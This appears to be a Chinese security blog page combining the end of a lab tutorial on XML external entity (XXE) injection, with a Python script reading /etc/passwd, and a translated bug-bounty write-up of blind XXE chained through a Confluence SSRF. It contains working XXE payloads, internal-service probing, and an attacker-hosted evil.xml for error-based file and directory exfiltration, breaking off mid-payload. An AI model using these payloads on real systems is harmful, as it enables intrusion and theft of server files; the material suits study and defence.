class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们来访问一下index.php，可以看到确实是执行了phpinfo();函数</p><p><a href="https://static2.ichunqiu.com/icq/resources/fileupload/60475/index.png"><img src="https://static2.ichunqiu.com/icq/resources/fileupload/60475/index.png" alt="index"></a></p><h4 id="步骤2-使用并分析恶意脚本"><a href="#步骤2-使用并分析恶意脚本" class="headerlink" title="步骤2 使用并分析恶意脚本"></a>步骤2 使用并分析恶意脚本</h4><p>请访问**<code>http://file.ichunqiu.com/397qjz4d</code>**下载实验文件。</p><p>打开cmd，输入 <code>python 脚本所在路径\xxe-url2.py</code>(可将脚本直接拖入cmd命令行) ，然后输入要读取的文件及要访问的地址.</p><p>如下图所示，脚本放在<code>C:\Documents and Settings\Administrator\My Documents\下载\</code>路径下，运行脚本，输入示例payload</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="comment">///etc/passwd</span></span><br></pre></td></tr></table></figure><p>示例地址</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//172.16.12.2/simplexml_load_string.php</span></span><br></pre></td></tr></table></figure><p><a href="https://static2.ichunqiu.com/icq/resources/fileupload/60475/poc.gif"><img src="https://static2.ichunqiu.com/icq/resources/fileupload/60475/poc.gif" alt="poc"></a></p><p><code>xxe-url2.py</code>的代码如下，通过<code>urllib2</code>的request方法用POST方式向目标地址发送XML数据，返回的数据即为服务器<code>172.16.12.2</code>下的<code>/etc/passwd</code>文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">u&#x27;输入要读取的文件，如file:///etc/passwd&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload = raw_input()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">u&#x27;输入要访问的地址，如http://172.16.12.2/simplexml_load_string.php&#x27;</span></span><br><span class="line"></span><br><span class="line">    url = raw_input()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#url = &#x27;http://192.168.70.235/simplexml_load_string.php&#x27;</span></span><br><span class="line"></span><br><span class="line">    headers = &#123;<span class="string">&#x27;Content-type&#x27;</span>: <span class="string">&#x27;text/xml&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    xml = <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;&#x27;</span> + payload + <span class="string">&#x27;&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">    req = urllib2.Request(url = url,headers = headers, data = xml)</span><br><span class="line"></span><br><span class="line">    res_data = urllib2.urlopen(req)</span><br><span class="line"></span><br><span class="line">    res = res_data.read()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> res</span><br></pre></td></tr></table></figure><h4 id="实验结果分析与总结"><a href="#实验结果分析与总结" class="headerlink" title="实验结果分析与总结"></a>实验结果分析与总结</h4><p>本次实验主要了解了XML的基础知识以及PHP中XML的使用，了解了漏洞出现的原理，学习了通过构造恶意的外部实体访问，让服务器读取敏感文件内容的恶意操作。</p><p>XML外部实体注入可以造成的危害有：</p><ul><li>任意文件读取</li><li>系统命令执行</li><li>内网主机及服务探测</li></ul><p>本次实验我们主要进行了任意文件读取的操作，系统命令执行需要在安装了EXPECT扩展的PHP环境下才能执行，内网主机及服务探测可以通过HTTP协议来执行。</p><h4 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h4><ul><li>使用libxml2.8.0以上版本xml解析库，默认禁止外部实体的解析</li><li>对于PHP,由于simplexml_load_string函数的XML解析问题出在libxml库上,所以加载实体前可以调用函数进行过滤</li><li>可将外部实体、参数实体和内联DTD都被设置为false，从而避免基于XXE漏洞的攻击。</li></ul><p><a href="https://www.cnblogs.com/cui0x01/p/8823690.html">https://www.cnblogs.com/cui0x01/p/8823690.html</a></p><hr><p>为什么这个端点能够引起我的注意，是因为这个端点响应的是一个简单的<code>XML</code>结构的错误信息和404。</p><p>请求：</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> /interesting/ HTTP/<span class="number">1.1</span></span><br><span class="line"><span class="symbol">Host:</span> server.company.com</span><br></pre></td></tr></table></figure><p>响应</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">404</span> <span class="built_in">Not</span> Found</span><br><span class="line"><span class="symbol">Server:</span> nginx</span><br><span class="line"><span class="symbol">Date:</span> Tue, <span class="number">04</span> Dec <span class="number">2018</span> <span class="number">10</span>:<span class="number">08</span>:<span class="number">18</span> GMT</span><br><span class="line">Content-Type: <span class="keyword">text</span>/xml</span><br><span class="line">Content-Length: <span class="number">189</span></span><br><span class="line"><span class="symbol">Connection:</span> keep-alive</span><br><span class="line"></span><br><span class="line">&lt;result&gt;</span><br><span class="line">&lt;errors&gt;</span><br><span class="line">&lt;<span class="keyword">error</span>&gt;The request <span class="built_in">is</span> invalid: The requested resource could <span class="built_in">not</span> be found.&lt;/<span class="keyword">error</span>&gt;</span><br><span class="line">&lt;/errors&gt;</span><br><span class="line">&lt;/result&gt;</span><br></pre></td></tr></table></figure><p>我改变请求的方法为<code>POST</code>时，在<code>header</code>头部添加 <code>Content-Type: application/xml</code>并在<code>POST</code>数据中添加了一个不合法的<code>XML</code>数据，响应更加说明这里有<code>XXE</code>漏洞了。</p><p>请求：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /interesting/ HTTP/1.1</span><br><span class="line"><span class="section">Host: server.company.com</span></span><br><span class="line"><span class="section">Content-Type: application/xml</span></span><br><span class="line"><span class="section">Content-Length: 30</span></span><br><span class="line"></span><br><span class="line">&lt;xml version=<span class="string">&quot;abc&quot;</span> ?&gt;</span><br><span class="line">&lt;Doc/&gt;</span><br></pre></td></tr></table></figure><p>响应：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">errors</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">error</span>&gt;</span>The request is invalid: The request content was malformed:</span><br><span class="line">XML version &quot;abc&quot; is not supported, only XML 1.0 is supported.<span class="tag">&lt;/<span class="name">error</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">errors</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但是当我发送一个正确的结构化的<code>XML</code>文档时：<br>请求：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /interesting/ HTTP/1.1</span><br><span class="line">Host: server.company.com</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 30</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Doc</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>响应：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">errors</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">error</span>&gt;</span>Authentication failed: The resource requires authentication, which was not supplied with the request<span class="tag">&lt;/<span class="name">error</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">errors</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意了，服务器明显需要凭证，在交互的过程中。遗憾的是，没有文档说明应该如何提供凭证，我也无法在任何地方找到可能有效的凭证。这可能是个坏消息，因为我以前遇到的许多XXE漏洞需要与端点进行某种“有效”交互。如果没有身份验证，利用这个漏洞可能会变得困难得多。</p><p>但是现在还没有必要担心!在任何情况下，您都应该尝试包含<code>DOCTYPE</code>定义的字串，以查看是否完全禁止使用外部实体，或者是否可以继续追求乐趣和回报。所以我试着发送了如下请求包:</p><p>请求</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">ext</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://59c99fu65h6mqfmhf5agv1aptgz6nv.burpcollaborator.net/x&quot;</span>&gt;</span> %ext;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br></pre></td></tr></table></figure><p>响应：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The server was not able <span class="selector-tag">to</span> produce <span class="selector-tag">a</span> timely response <span class="selector-tag">to</span> your request.</span><br></pre></td></tr></table></figure><p>我看了下我的<code>Burp Collaborator</code>交互界面，没有期望的<code>HTTP</code>请求，只有如下部分。</p><p>幸运的是！服务器明显解析了我的域名，但是没有<code>HTTP</code>请求。此外，注意到了服务器在几秒之后出现500错误。</p><p>看起来像防火墙起作用了。我继续尝试进行针对不同端口的出站<code>HTTP</code>请求。但是没有可以达到效果的。所有端口都超时了，显示受影响的服务器至少可以依赖防火墙成功地阻止所有非预期的出站流量。给网络安全团队5分!</p><h2 id="只能做-blind-xxe"><a href="#只能做-blind-xxe" class="headerlink" title="只能做 blind xxe"></a>只能做 blind xxe</h2><p>在这一点上，我有一个有趣的发现，但还没有什么真正值得说明的。通过尝试访问本地文件、内部网络和内部服务，我希望能够从中获得一份中危的报告。</p><p>为了证明影响，我展示了此漏洞可以用来成功确定文件是否存在:</p><p>请求：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">ext</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span> %ext;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br></pre></td></tr></table></figure><p>响应</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The markup declarations contained <span class="keyword">or </span>pointed to <span class="keyword">by </span>the document type declaration must <span class="keyword">be </span>well-formed.</span><br></pre></td></tr></table></figure><p>这表明文件存在，XML解析器可以打开和读取文件，但是文件的内容不是有效的文档类型定义(DTD)，因此解析器失败并抛出错误。换句话说，外部实体的加载并没有被禁用，但是我们似乎没有得到任何输出。在这个阶段，这似乎是一个blind XXE漏洞。</p><p>假设使用的是<code>Java</code>的<code>SAX Parser</code>解析器，因为报错似乎和<code>Java</code>错误类<a href="https://github.com/walkmod/walkmod-core/issues/82">有联系</a><code>org.xml.sax.SAXParseExceptionpublicId</code></p><p>这很有趣，因为Java在涉及XXE时有许多特性，我们稍后将指出这一点。</p><p>当我们访问的文件不存在时，响应是这样的：</p><p>请求</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">ext</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwdxxx&quot;</span>&gt;</span> %ext;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br></pre></td></tr></table></figure><p>响应：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">The</span> request is <span class="attr">invalid</span>: <span class="title class_">The</span> request content was <span class="attr">malformed</span>:</span><br><span class="line"><span class="regexp">/etc/</span>passwdxxx (<span class="title class_">No</span> such file or directory)</span><br></pre></td></tr></table></figure><p>好的，有用但不太好; 如何使用这个<code>blind XXE</code>漏洞作为基本端口扫描器？</p><p>请求：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">ext</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://localhost:22/&quot;</span>&gt;</span> %ext;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br></pre></td></tr></table></figure><p>响应</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The request <span class="keyword">is</span> invalid: The request content was malformed:</span><br><span class="line">Invalid Http response</span><br></pre></td></tr></table></figure><p>很好——这意味着我们可以列举内部服务。这仍然不是我想要的很酷的结果，但至少是一些值得报道的东西。这种类型的<code>blind XXE</code>有效地表现为与<code>blind</code>服务器端请求伪造(<code>SSRF</code>)漏洞类似的行为:您可以启动内部<code>HTTP</code>请求，但不能读取响应。</p><p>这让我怀疑是否可以应用任何其他与<code>ssrf</code>相关的技术，以便更好地利用这个<code>blind XXE</code>漏洞。需要检查的一件事是对其他协议的支持，包括<code>https</code>、<code>gopher</code>、<code>ftp</code>、<code>jar</code>、<code>scp</code>等。</p><p>请求:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [ <span class="meta">&lt;!ENTITY % <span class="keyword">ext</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;gopher://localhost/&quot;</span>&gt;</span> %ext; ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br></pre></td></tr></table></figure><p>响应：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">The</span> request <span class="keyword">is</span> invalid: <span class="type">The</span> request content was malformed:</span><br><span class="line">unknown <span class="keyword">protocol</span>: <span class="title class_">gopher</span></span><br></pre></td></tr></table></figure><p>这很有趣，因为它将用户提供的协议在错误消息中返回回来。我们把它记下来，以后再用。</p><p>漏洞与<code>blind ssrf</code>漏洞具有相似性，看看我们是否能够访问任何内部<code>web</code>应用程序是有意义的。由于我的目标公司似乎与相当广泛和多样化的开发人员合作，<code>GitHub</code>中充斥着<code>x.company.internal</code>格式的地址。我找到了一些看起来很有前途的内部资源（很可能有漏洞的服务器）。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wiki<span class="selector-class">.company</span><span class="selector-class">.internal</span></span><br><span class="line">jira<span class="selector-class">.company</span><span class="selector-class">.internal</span></span><br><span class="line">confluence<span class="selector-class">.company</span><span class="selector-class">.internal</span></span><br></pre></td></tr></table></figure><p>考虑到防火墙之前阻止了我的传出流量，我想验证内部流量是否也被阻止了，或者内部网络是否更可信。</p><p>请求：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">ext</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://wiki.company.internal/&quot;</span>&gt;</span> %ext;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br></pre></td></tr></table></figure><p>响应</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The markup declarations contained <span class="keyword">or </span>pointed to <span class="keyword">by </span>the document type declaration must <span class="keyword">be </span>well-formed.</span><br></pre></td></tr></table></figure><p>有趣的是，我们以前看到过这个错误消息，它表示读取了请求的资源，但是没有正确格式化。这意味着允许内部网络通信，并且我们的内部请求成功了!</p><p>这就是我们的处境。使用<code>blind XXE</code> 漏洞，可以向许多内部web应用程序发起请求，枚举文件系统中文件的存在性，以及枚举在所有内部主机上运行的服务。在这一点上，我报告了这种漏洞，并在周末前往耶路撒冷的城市之旅中思考进一步的可能性。</p><h2 id="独眼称王"><a href="#独眼称王" class="headerlink" title="独眼称王"></a>独眼称王</h2><p>周末精神焕发地回来后，我下定决心要找出这个脆弱点可能造成的影响。具体来说，如果我可以在内部网络上找到一个类似代理的主机，未经过滤的内部网络流量可能被滥用将流量路由到外部。</p><p>通常，在没有任何形式的可读反馈的情况下，在web应用程序上发现漏洞几乎是不可能的。幸运的是，在<a href="https://ecosystem.atlassian.net/browse/OAUTH-344">Jira中存在一个已知的SSRF漏洞</a>，这已经在<a href="https://medium.com/bugbountywriteup/piercing-the-veil-server-side-request-forgery-to-niprnet-access-c358fd5e249a">许多文章中</a>得到了证明。</p><p>我立即去测试我的运气与内部的Jira服务器</p><p>请求：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">ext</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;https://jira.company.internal/plugins/servlet/oauth/users/icon-uri?consumerUri=http://4hm888a6pb127f2kwu2gsek23t9jx8.burpcollaborator.net/x&quot;</span>&gt;</span> %ext;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br></pre></td></tr></table></figure><p>响应：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The request is invalid: The request content was malformed:</span><br><span class="line">sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target</span><br></pre></td></tr></table></figure><p><code>HTTPS</code> 的流量失败了，如果 <code>SSL</code> 验证出错的话。幸运的是，<code>Jira</code> 默认在<code>8080</code>端口上运行<code>HTTP</code>服务。</p><p>请求：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">ext</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://jira.company.internal:8080/plugins/servlet/oauth/users/icon-uri?consumerUri=http://4hm888a6pb127f2kwu2gsek23t9jx8.burpcollaborator.net/x&quot;</span>&gt;</span> %ext;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br></pre></td></tr></table></figure><p>响应：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">The</span> request is <span class="symbol">invalid:</span> <span class="title class_">The</span> request content was <span class="symbol">malformed:</span></span><br><span class="line"><span class="symbol">http:</span>/<span class="regexp">/jira.company.internal:8080/plugins</span><span class="regexp">/servlet/oauth</span><span class="regexp">/users/icon</span>-uri</span><br></pre></td></tr></table></figure><p>我又检查了一下<code>Burp Collaborator</code> 的交互信息，但运气不佳。<code>Jira</code>实例可能已经打了补丁，或者已经禁用了易受攻击的插件。于是，我疯狂而徒劳地寻找不同类型的<code>Wiki</code>应用程序上已知的<code>SSRF</code>漏洞之后(并不是最优选择)，我决定测试内部<code>Confluence</code>实例是否存在相同的<code>Jira</code> 漏洞(默认情况下运行在端口8090上)。</p><p>请求：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">ext</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://confluence.company.internal:8090/plugins/servlet/oauth/users/icon-uri?consumerUri=http://4hm888a6pb127f2kwu2gsek23t9jx8.burpcollaborator.net/x&quot;</span>&gt;</span> %ext;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br></pre></td></tr></table></figure><p>响应：</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The request <span class="built_in">is</span> invalid: The request content was malformed:</span><br><span class="line">The markup declarations contained <span class="built_in">or</span> pointed <span class="keyword">to</span> <span class="keyword">by</span> the document type declaration must be well-formed.</span><br></pre></td></tr></table></figure><p>发现</p><p>我们成功地通过一个内部易受攻击的<code>Confluence</code>来绕过防火墙限制出站的<code>internet</code>流量。这意味着我们现在可以尝试<code>XXE</code>的经典方法。让我们从托管一个<code>evil.xml</code>文件开始。攻击者服务器托管<code>evil.xml</code>，包含以下内容，希望触发有趣的错误消息:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM <span class="string">&quot;file:///&quot;</span>&gt;</span><br><span class="line">&lt;!ENTITY % ent <span class="string">&quot;&lt;!ENTITY data SYSTEM &#x27;%file;&#x27;&gt;&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>让我们更详细地看看这些参数实体的定义:</p><ol><li>将外部引用(在本例中是系统的&#x2F;目录)的内容加载到变量中(%file)</li><li>定义一个变量(%ent);它实际上只是将各个部分链接在一起来解释第三个实体</li><li>尝试在（%file）位置访问资源;(无论它指向何处)并将该位置中的任何内容加载到实体（data）中。</li></ol><p>注意，我们希望第三个定义失败，因为<code>（%file）</code>的内容;不会指向有效的资源位置，而是包含完整目录的内容。</p><p>现在，使用<code>Confluence</code>（<code>proxy</code>）指向我们的恶意文件，并确保参数<code>（%ent）</code>; 实体参数<code>(&amp;data；)</code>被访问以触发目录访问:</p><p>请求：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">ext</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://confluence.company.internal:8090/plugins/servlet/oauth/users/icon-uri?consumerUri=http://my_evil_site/evil.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%ext;</span></span><br><span class="line"><span class="meta">%ent;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="symbol">&amp;data;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br></pre></td></tr></table></figure><p>响应</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">no protocol: <span class="keyword">bin</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">boot</span></span><br><span class="line"><span class="keyword"></span>dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>太棒了!列出了服务器的目录内容!</p><p>有趣的是，这显示了从服务器返回基于错误的输出的另一种方法，即指定一个“丢失的”协议，而不是我们前面看到的无效协议。</p><p>这可以帮助我们解决在读取包含冒号的文件时遇到的最后一个难点，因为使用上述方法读取<code>/etc/passwd</code>会导致以下错误:</p><p>请求：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">ext</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://confluence.company.internal:8090/plugins/servlet/oauth/users/icon-uri?consumerUri=http://my_evil_site/evil.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%ext;</span></span><br><span class="line"><span class="meta">%ent;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="symbol">&amp;data;</span><span class="tag">&lt;/<span 